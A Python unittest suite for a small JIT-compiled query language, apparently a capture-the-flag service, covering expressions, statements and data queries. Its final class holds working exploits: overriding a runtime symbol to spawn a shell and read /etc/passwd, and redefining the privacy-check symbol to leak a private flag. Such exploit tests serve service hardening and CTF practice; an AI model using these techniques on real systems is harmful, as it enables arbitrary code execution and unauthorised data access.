import json
import subprocess
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any

ROOT: Path = Path(__file__).absolute().parent.parent
COMPILER: Path = ROOT / 'cmake-build-debug' / 'jit_playground'
DEMO_DIR: Path = ROOT / 'demo'


def read_json_lines(f: Path) -> list[Any]:
    return [json.loads(l) for l in f.read_text().split('\n') if l]


def compile(code: str, output: Path) -> None:
    p = subprocess.Popen([str(COMPILER), '/dev/stdin', str(output)], stdin=subprocess.PIPE)
    p.communicate(input=code.encode(), timeout=5)
    p.wait()
    if p.returncode != 0:
        raise Exception(f'Compilation failed with code {p.returncode}')


class CompileTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir: Path = Path(self.enterContext(TemporaryDirectory()))

    def run_prog(self, code: str, function: str = 'jit_entrypoint', param: Any = None) -> str:
        compile(code, self.tmpdir / 'code.so')
        return self.run_last(function, param)

    def run_last(self, function: str, param: Any) -> str:
        cmd: list[str] = [str(self.tmpdir / 'code.so'), function, json.dumps(param)]
        return subprocess.check_output(cmd, cwd=DEMO_DIR).decode().strip()

    def run_expr(self, code: str) -> str:
        return self.run_prog('func jit_entrypoint() { return ' + code + '; }')

    def run_stmt(self, code: str) -> str:
        return self.run_prog('func jit_entrypoint() { ' + code + ' }')


class ExpressionsTestCase(CompileTestCase):
    def test_simple_constants(self):
        self.assertEqual('1', self.run_expr('1'))
        self.assertEqual('["a",{},{"a":"b"},null,2,true,false]',
                         self.run_expr('["a", {}, {"a":"b"}, null, 2, true, false]'))

    def test_operators(self):
        self.assertEqual('9', self.run_expr('1+2*3+4-2'))
        self.assertEqual('true', self.run_expr('1 && 2'))
        self.assertEqual('false', self.run_expr('1 && 0'))
        self.assertEqual('[true,2,"ab","c7",4]', self.run_expr('[!false, 5+-3, "a"+"b", "c"+7, 2*(1+1)]'))
        self.assertEqual('[1,2,3]', self.run_expr('[len {"a":0}, len [1,2], len "abc"]'))
        self.assertEqual('[11,1]', self.run_expr('[ [5,11,3][1], {"a":1,"b":2}["a"] ]'))
        self.assertEqual('[true,false,true,true,false,true,true,false]', self.run_expr('[1==1,1!=1,1!=2, 1<2, 1>2, 1<=2, 1<=1, 1>=2]'))


class StatementsTestCase(CompileTestCase):
    def test_variables(self):
        self.assertEqual('2', self.run_stmt('a=1; a=2; return a;'))
        self.assertEqual('1', self.run_stmt('a=1; b=2; return a;'))
        self.assertEqual('4', self.run_stmt('a=1; b=5; return b-a;'))

    def test_object_assignment(self):
        self.assertEqual('[1,2,3]', self.run_stmt('a=[3,3,3]; a[0]=1 ; a[1]=2; a[2]=3; return a;'))
        self.assertEqual('{"b":2,"a":1}', self.run_stmt('a={"a":0}; a["a"]=1 ; a["b"]=2; return a;'))
        self.assertEqual('[1,2,3]', self.run_stmt('a=[1]; a[+]=2; a[+]=3; return a;'))
        self.assertEqual('[[1],[1],[]]', self.run_stmt('a=[[], [], []]; a[0][+]=1; a[1]=a[0]; return a;'))

    def test_print(self):
        self.assertEqual('1\n2\nundefined', self.run_stmt('print(1); return print(1+1, 3);'))

    def test_functions(self):
        code = '''
        func xadd(a, b) { return a+2*b; }
        func jit_entrypoint() { return xadd(xadd(1,2), xadd(3,4)); }  // = 5 + 2*11
        '''
        self.assertEqual('27', self.run_prog(code))
        code = '''
        func helper(a, b) { a = a + b; return a; }
        func jit_entrypoint() { return helper(1, 2); }
        '''
        self.assertEqual('3', self.run_prog(code))


class QueriesTestCase(CompileTestCase):
    data1 = read_json_lines(DEMO_DIR / 'data1.json')

    def test_simple_query(self):
        self.assertEqual('[]', self.run_prog('query q on empty;', 'q'))

    def test_demodata_queries(self):
        code = '''
        func is_in_team(entry, teamname) { return entry["team"] == teamname; }
        func get_name(entry) { return entry["name"]; }
        func get_points(entry) { return entry["points"]; }
        func sum(data, acc) { return data + (acc ?: 0); }
        
        query all_entries on data1;        
        query one_member on data1 filter is_in_team map get_name limit 1;
        query team_points on data1 filter is_in_team map get_points reduce sum; 
        '''
        self.assertEqual(self.data1, json.loads(self.run_prog(code, 'all_entries')))
        self.assertEqual('["mkb"]', self.run_last('one_member', 'saarsec'))
        self.assertEqual('200', self.run_last('team_points', 'saarsec'))

    def test_privacy(self):
        compile('query jit_entrypoint on private1;', self.tmpdir / 'code.so')
        r = subprocess.run([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.assertNotEqual(0, r.returncode)
        self.assertNotIn(b'SAAR', r.stdout)
        self.assertIn(b'access denied', r.stderr)


class ExploitsTestCase(CompileTestCase):
    def test_system(self):
        code = '''
        // no function checks => we can call any symbol in any library. just the calling convention is an issue
        func jit_rt_constant(){}  // nop out that rt function - constant string is in $rdi after return. Unfortunately in "".
        func jit_entrypoint() { system("sh"); }  // then we can invoke system() which links properly
        '''
        # not sure how realistic it is that we can send input to the executable.
        # maybe if we just bind the connection to the program?
        compile(code, self.tmpdir / 'code.so')
        p = subprocess.Popen([str(self.tmpdir / 'code.so'), 'jit_entrypoint'], cwd=DEMO_DIR,
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        output, _ = p.communicate(input=b'cat /etc/passwd', timeout=3)
        self.assertIn(b'root:x:0:0:root:/root:/bin/bash', output)

    def test_system_2(self):
        # TODO find some helper gadget which allows us to load arbitrary strings to $rdi
        pass

    def test_nop_out_privacy_check(self):
        # we can override the libjit_rt symbol which determines a collection's privacy (DataStorage::isPublic).
        code = '''
        func _ZN11DataStorage8isPublicEv(){ return true; }
        query jit_entrypoint on private1;  // some private collection
        '''
        self.assertEqual('[{"flag":"SAAR{...}"}]', self.run_prog(code))

    # other weaknesses: you can read/write the stack like this:
    # func f(a,b,c,d,e,f,g,h) { h=0; }  func jit_entrypoint() { f(); }
    # but that's likely not exploitable, because pointers are no valid Value


del CompileTestCase

if __name__ == '__main__':
    unittest.main()
